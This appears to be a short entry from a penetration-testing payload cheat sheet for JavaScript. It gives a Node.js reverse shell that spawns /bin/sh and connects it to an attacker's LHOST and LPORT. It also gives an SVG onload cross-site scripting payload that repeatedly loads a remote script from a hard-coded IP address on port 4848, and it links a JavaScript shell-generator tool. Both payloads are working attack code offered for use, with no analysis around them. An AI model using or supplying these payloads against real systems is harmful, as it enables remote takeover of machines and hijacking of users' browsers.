# Javascript
```
(
  function(){
    var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(LPORT, "LHOST", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
     });
    return /a/;
  }
)();
```
#### Javascript shell creator
[JSshell](https://github.com/shelld3v/JSshell) 
```
<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//171.224.181.106:4848"},999)>
```
